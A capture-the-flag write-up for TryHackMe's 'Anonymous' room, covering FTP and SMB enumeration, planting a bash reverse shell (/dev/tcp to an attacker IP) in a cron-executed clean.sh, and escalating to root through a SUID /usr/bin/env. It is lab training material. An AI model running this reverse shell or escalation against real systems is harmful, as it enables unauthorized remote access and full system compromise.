![Screenshot 2023-09-01 232811.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/KHhJB15.png)

![Screenshot 2023-09-01 232811.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/876a5185c429c9703e625cb48c39637b.png)

# Anonymous

![Screenshot 2023-09-01 232811.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/Screenshot_2023-09-01_232811.png)

- **Difficulty:** Medium
- **Creator:** [Nameless0ne](https://tryhackme.com/p/Nameless0ne)

The Anonymous Playground CTF is a medium level room on TryHackMe that includes exploitation of FTP, SMB, cron jobs, and SUID binaries. It has 4 tasks and 2 flags. The tasks can be completed just from basic enumeration of the target machine. The machine is vulnerable to a variety of attack

vectors, including:

- **FTP**
- **SMB**
- **cron jobs**
- **Setuid binaries**

## Walkthrough

## Network Scanning

```bash
nmap -A -T4 -Pn 10.10.200.152 -oN nmap_result.txt
```

![Screenshot 2023-09-01 232530.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/Screenshot_2023-09-01_232530.png)

Nmap detected FTP service running on port 21, SSH service on port 22, SMB on port 139 and 445. The Nmap also detected that Anonymous Login is also enabled on the application that makes it accessible right away.

### **Enumeration**

Logging into FTP

```bash
ftp 10.10.152.93
ls -la
cd scripts
ls -la
get clean.sh
get removed_files.log
get to_do.txt
```

![Screenshot 2023-09-01 233341.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/Screenshot_2023-09-01_233341.png)

The to_do.txt file was a reminder for disabling Anonymous Login. It is not useful from the attacker’s perspective. The removed_files.log file contained logs from the clean-up script indicating that there is nothing to delete.

![Screenshot 2023-09-01 233937.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/Screenshot_2023-09-01_233937.png)

The clean. sh script is a shell script that seemed to perform log entries and delete files from the /tmp/ directory.

![Screenshot 2023-09-01 234119.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/Screenshot_2023-09-01_234119.png)

With nothing more to enumerate from the FTP service, the enumeration of SMB service was initiated. Smbclient was used to perform an Anonymous login on the Target Machine. It had a share by the name of pics. When accessed, the pics share contained two images: corgo2.jpg and puppos.jpeg. Both of those images were downloaded to the local Kali Machine.

```bash
smbclient -L \\anonymous -I 10.10.3.52
smbclient //10.10.3.52/pics
ls
get corgo2.jpg
get puppos.jpeg
```

![Screenshot 2023-09-01 234529.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/Screenshot_2023-09-01_234529.png)

After opening the image files, it was clear that SMB was supposed to be a rabbit hole. Both images are not important from the attacker’s perspective.

![Screenshot 2023-09-01 234850.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/Screenshot_2023-09-01_234850.png)

![Screenshot 2023-09-01 234918.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/Screenshot_2023-09-01_234918.png)

## **Exploitation**

Back to the FTP service, it was detected that it was possible to upload files in the scripts directory. This meant that the attacker can create a clean.sh script with reverse shellcode inside it and then replace it with the one that is currently located on the target machine and then wait for the script to get executed.

```bash
cat > clean.sh
#!/bin/bash
bash -i >& /dev/tcp/10.17.11.201/5555 0>&1
```

Before uploading the script, a netcat listener was started on the Local Kali Machine to capture the shell that would be invoked after the [clean.sh](http://clean.sh/) script gets executed on the target machine. The port number mentioned inside the reverse shell script must be used while invoking the netcat listener. After connecting to the FTP service, the [clean.sh](http://clean.sh/) script was replaced using the put command.

```bash
ftp 10.10.3.52
cd scripts
put clean.sh
```

The netcat listener captured the reverse shell that was generated due to the execution of the [clean.sh](http://clean.sh/) script on the target machine. The session generated belonged to the namelessone user on the target machine. After listing the contents of the user’s home directory, the user.txt flag was found.

![Screenshot 2023-09-01 235748.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/Screenshot_2023-09-01_235748.png)

**Privilege Escalation**

The Post Exploitation Enumeration to find the methods to elevate the privilege on the access started with enumerating the SUID bits. Find command is used for this kind of enumeration. It was observed that /usr/bin/env was assigned to SUID. It meant it can be used to exploit the machine and get elevated access.

```bash
find / -perm -u=s 2>/dev/null
```

![Screenshot 2023-09-02 000105.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/Screenshot_2023-09-02_000105.png)

![Screenshot 2023-09-02 000224.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/Screenshot_2023-09-02_000224.png)

```bash
/usr/bin/env /bin/sh -p
```

When executed on the namelessone’s shell, a root shell was invoked. This was checked using the whoami command. Finally, to finish the challenge the root flag was read using the cat command.

![Screenshot 2023-09-02 000512.png](Anonymous%20125ab00f68dc466eb806178faa3a55bb/Screenshot_2023-09-02_000512.png)